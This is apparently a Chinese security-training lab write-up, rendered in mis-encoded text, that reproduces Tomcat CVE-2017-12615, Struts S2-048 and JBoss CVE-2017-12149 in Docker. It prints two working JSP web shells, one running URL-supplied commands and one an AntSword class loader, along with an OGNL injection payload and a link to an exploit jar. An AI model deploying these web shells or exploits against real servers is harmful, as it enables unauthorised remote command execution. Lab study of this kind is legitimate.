---
slug: /net-security/03/02
---



POC *Proof of Concept* åœ¨ç½‘ç»œå®‰å…¨ï¼Œä¸€èˆ¬æŒ‡å»è¯æ˜ç³»ç»Ÿå­˜åœ¨æ¼æ´çš„ä»£ç ã€‚

EXP *Exploit* åˆ©ç”¨ç³»ç»Ÿæ¼æ´è¿›è¡Œæ”»å‡»çš„ç¨‹åºã€‚

Payload æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…åç»­å®ç°ä¾µå®³çš„ä»£ç ã€‚

RCE *Remote Command Execution* è¿œç¨‹ä»£ç æ‰§è¡Œ



## DVWA 

ğŸ‘‰ è§ [DVWA å®‰è£…åŠä½¿ç”¨](https://wukaipeng.com/technique/net-security/02/05)



## æ¼æ´ 1ï¼šTomcat

Tomcat PUT æ–¹æ³•ä»»æ„å†™æ–‡ä»¶æ¼æ´ï¼ˆCVE-2017-12615ï¼‰

Tomcat ç‰ˆæœ¬ï¼š7.0.0-7.0.79ã€8.5.19

å®‰è£… cvedï¼Œè¿™é‡ŒåŒ…å«æœ‰è¯¥æ¼æ´çš„å¤ç°ç¯å¢ƒã€‚

```shell
docker search CVE-2017-12615
docker pull docker.io/cved/cve-2017-12615
docker run -d -p 8080:8080 docker.io/cved/cve-2017-12615
```

### å·¥å…·ï¼šBurp Suite

ğŸ‘‰ ä¸‹è½½åœ°å€ï¼š[https://portswigger.net/burp](https://portswigger.net/burp)

Burp Suite ç”¨äºæ¸—é€æµ‹è¯•ï¼Œå¯ä»¥ä¸‹è½½ç¤¾åŒºç‰ˆæœ¬ä½¿ç”¨ã€‚

åœ¨ Burp Suite ä¸­æ‰“å¼€ä¸€ä¸ªä¸´æ—¶é¡¹ç›®ï¼Œåœ¨ Setting ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å·²ç» Burp Suite åœ¨æœ¬åœ°çš„ 8080 ç«¯å£å¼€å¯äº†ä¸€ä¸ªæœåŠ¡ï¼Œå»ç›‘å¬æµé‡ã€‚

![](http://img.wukaipeng.com/2023/0830-071920-image-20230830071919715.png)

ç„¶ååœ¨ç«ç‹æµè§ˆå™¨ä¸Šï¼ŒæŠŠæˆ‘ä»¬æµé‡è½¬å‘åˆ° 8080 ä¸­ï¼š

![](http://img.wukaipeng.com/2023/0830-072329-image-20230830072329690.png)

è®¿é—® cved

> è¿™é‡Œæˆ‘çš„ cved æ˜¯éƒ¨ç½²åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ çš„ cved éƒ¨ç½²åœ¨æœ¬åœ°ä¸Šï¼Œå¯ä»¥è€ƒè™‘åœ¨æœ¬åœ°å¯åŠ¨ä¸€ä¸ª hostï¼Œhost å°†è¯·æ±‚è½¬å‘åˆ°ä½ æœ¬åœ°çš„ cved ç«¯å£ï¼Œæ¯”å¦‚ç”¨ switchhosts å¼€ä¸€ä¸ª example.com è½¬å‘åˆ° 127.0.0.1:8081ã€‚

![](http://img.wukaipeng.com/2023/0831-073404-image-20230831073404208.png)

åœ¨ Burp Suite ä¸­å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„è¯·æ±‚å·²ç»è¢«æ‹¦æˆªäº†ï¼š

![](http://img.wukaipeng.com/2023/0831-071052-image-20230831071052158.png)

æ³¨æ„éœ€è¦æ‰“å¼€ã€ŒIntercept is onã€æŒ‰é’®ï¼ˆæœªæ‰“å¼€ä¹‹å‰æŒ‰é’®æ˜¯ã€Œintercept is offã€ï¼‰ã€‚



### PoCï¼šä¸Šä¼ æ–‡ä»¶

å³é”®èœå•æŠŠè¯·æ±‚å‘é€åˆ° Repeater ä¸­ï¼ŒRepeater å¯ä»¥åå¤å‘é€åŒä¸€ä¸ªè¯·æ±‚ï¼Œæ–¹ä¾¿æµ‹è¯•ã€‚

![](http://img.wukaipeng.com/2023/0831-072701-image-20230831072701080.png)

![](http://img.wukaipeng.com/2023/0831-073528-image-20230831073528549.png)

ä¿®æ”¹è¯·æ±‚æ–¹æ³•

![](http://img.wukaipeng.com/2023/0831-074605-image-20230831074605197.png)

å¯ä»¥çœ‹åˆ°ï¼Œå½“æˆ‘ä»¬è®¿é—® `/poc.txt` çš„æ—¶å€™æˆåŠŸå“åº”ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶å·²ç»å†™å…¥æœåŠ¡å™¨ã€‚

![](http://img.wukaipeng.com/2023/0831-074534-image-20230831074534002.png)

### æ¼æ´åŸç†

é¦–å…ˆ Tomcat çš„ web.xml é…ç½®äº†å¯å†™ï¼ˆreadonly=falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶ï¼š

```xml {13-14}
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

å…¶æ¬¡ Tomcat æ˜¯ä¸å…è®¸ä¸Šä¼ æ–‡ä»¶çš„ï¼Œå› æ­¤å¦‚æœæ˜¯ `/poc.txt` ä¼šè¿”å› 404ï¼Œä½†æ˜¯ `/poc.txt/` å°±ç»•è¿‡äº† Tomcat çš„æ ¡éªŒï¼Œå¹¶ä¸”åœ¨æ–‡ä»¶ç³»ç»Ÿåœ¨ä¿å­˜çš„æ—¶å€™ `/poc.txt/` ä¼šè¢«è§£é‡Šæˆ `/poc.txt` ï¼Œæœ€ç»ˆå†™å…¥æˆåŠŸã€‚

> è¿™é‡Œå…¶å®è·Ÿ Tomcat çš„æ ¡éªŒæœºåˆ¶æœ‰å…³ï¼Œå®ƒæ˜¯é»‘åå•æ ¡éªŒæœºåˆ¶ï¼Œå®¹æ˜“ç»•è¿‡ï¼Œæ›´å®‰å…¨çš„æ–¹å¼æ˜¯ç”¨ç™½åå•ã€‚

### RCE

ä¸Šä¼  shell.jsp è„šæœ¬

![](http://img.wukaipeng.com/2023/0831-081605-image-20230831081604856.png)

åœ¨è¿™æ®µè„šæœ¬ä¸­ï¼Œä¼šè¯»å– URL ä¸Šå«åš `pwd` çš„å‚æ•°ï¼ŒåŒ¹é…ä¸º `wukaipeng` ä¹‹åï¼Œç„¶åè·å– `i` å‚æ•°ï¼Œå¹¶ä¸”æŠŠå¯¹åº”çš„å€¼å½“åšå‘½ä»¤æ¥æ‰§è¡Œï¼š

```java
<%
    if("wukaipeng".equals(request.getParameter("pwd"))){
        java.io.InputStream in = 
Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

å½“æˆ‘ä»¬è¯·æ±‚ `/shell.jsp?pwd=wukaipeng&i=whoami`ï¼Œå°±æ‰§è¡Œäº† `whoami` å‘½ä»¤ï¼š

![](http://img.wukaipeng.com/2023/0831-081736-image-20230831081736397.png)



### å·¥å…·ï¼šAntSword

èšå‰‘ï¼Œç½‘ç«™ç®¡ç†å·¥å…·ã€‚

ğŸ‘‰ å®‰è£…ä¸‹è½½æŒ‡å—ï¼š[https://www.yuque.com/antswordproject/antsword/srruro](https://www.yuque.com/antswordproject/antsword/srruro)

ä¸Šä¼ ä¸‹é¢çš„æ–‡ä»¶ `yijian.jsp` åˆ°ç½‘ç«™ä¸­ï¼š

```java
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
 
    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("passwd");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>

```

è¿æ¥

![](http://img.wukaipeng.com/2023/0901-083031-image-20230901083031019.png)

![](http://img.wukaipeng.com/2023/0901-083551-image-20230901083551553.png)



## æ¼æ´ 2ï¼šStructs

S2-048 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-9791ï¼‰

å½±å“ç‰ˆæœ¬: 2.0.0 - 2.3.32

ä¸‹è½½

```shell
docker search s2-048
docker pull docker.io/piesecurity/apache-struts2-cve-2017-5638
docker run -d -p 8080:8080 piesecurity/apache-struts2-cve-2017-5638
```

è®¿é—® `/showcase`

![](http://img.wukaipeng.com/2023/0901-090948-image-20230901090948685.png)

å»åˆ° Structs1 Integration

![](http://img.wukaipeng.com/2023/0902-084524-image-20230902084524083.png)

å¡«å†™è¡¨å•

![](http://img.wukaipeng.com/2023/0902-084950-20230902084903_rec_-convert.gif)

åœ¨ Ganster Name å­—æ®µä¸­ï¼Œå¡«å†™ OGNL è¡¨è¾¾å¼ `${3*4}`ï¼Œå¯ä»¥çœ‹åˆ°å®ƒè¢«æ‰§è¡Œäº†ï¼Œè¿”å›äº†ä¹˜ç§¯ç»“æœ `12`ã€‚

> OGNL *Object Graph Navigation Language* åœ¨ Java ä¸­ä½¿ç”¨çš„ä¸€ç§è¡¨è¾¾å¼è¯­è¨€ï¼Œå¯ä»¥æ“ä½œ Java ç±»ã€‚



### æ¼æ´åŸç†

æœ¬æ¬¡æ¼æ´è§¦å‘ç‚¹åœ¨ `org.apache.struts2.s1.Struts1Action.execute()` æ–¹æ³•ä¸­

![](http://img.wukaipeng.com/2023/0902-164315-image-20230902164314926.png)



## æ¼æ´ 3ï¼šJBoss

JBoss åŸºäº J2EE çš„å¼€æºçš„åº”ç”¨æœåŠ¡å™¨å’Œä¸­é—´ä»¶å¹³å°ã€‚

æ¼æ´ç‰ˆæœ¬ï¼š5.x å’Œ 6.x ç‰ˆæœ¬

è¿è¡Œ showcase

```shell
docker search CVE-2017-12149
docker pull docker.io/hackingpub/cve-2017-12149
docker run -d -p 8080:8080 hackingpub/cve-2017-12149
```

å®¹å™¨åˆšè¿è¡Œéœ€è¦å‡ åˆ†é’Ÿè¿›è¡Œåˆå§‹åŒ–æ‰èƒ½è®¿é—®åˆ°ã€‚

### æ¼æ´åŸç†

ç”±äº Java ååºåˆ—åŒ–é”™è¯¯ç±»å‹ï¼Œå­˜åœ¨äº JBoss çš„ `HttpInvoker` ç»„ä»¶ä¸­çš„ `ReadOnlyAccessFilter` ä¸­ã€‚åœ¨è¿‡æ»¤å™¨åœ¨æ²¡æœ‰ä»»ä½•å®‰å…¨æ£€æŸ¥çš„æƒ…å†µä¸‹å°†å®¢æˆ·ç«¯çš„æ•°æ®æµè¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚

```java {15}
public void doFilter(ServletRequest request, ServletResponse response, 
FilterChain chain)
    throws IOException, ServletException
  {
    HttpServletRequest httpRequest = (HttpServletRequest)request;
 
    Principal user = httpRequest.getUserPrincipal();
    if ((user == null) && (this.readOnlyContext != null))
    {
      ServletInputStream sis = request.getInputStream();
      ObjectInputStream ois = new ObjectInputStream(sis);
      MarshalledInvocation mi = null;
      try
      {
        mi = (MarshalledInvocation)ois.readObject();  //æ¼æ´ç‚¹
      }
      catch (ClassNotFoundException e)
      {
        throw new ServletException("Failed to read MarshalledInvocation", e);
      }
      request.setAttribute("MarshalledInvocation", mi);
  mi.setMethodMap(this.namingMethodMap);
  Method m = mi.getMethod();
  if (m != null) {
    validateAccess(m, mi);
  }
}
chain.doFilter(request, response);
}
```

### RCE

âš’ï¸ä¸‹è½½å·¥å…·ï¼š[jbossååºåˆ—åŒ–_CVE-2017-12149.jar](https://github.com/Penggeor/NetSecurity/blob/main/ç¬¬ 04 å‘¨/å·¥å…·/jbossååºåˆ—åŒ–_CVE-2017-12149.jar)

æ³¨æ„è¯¥å·¥å…·éœ€è¦ Java ç¯å¢ƒ

![](http://img.wukaipeng.com/2023/0902-184024-image-20230902184024788.png)



















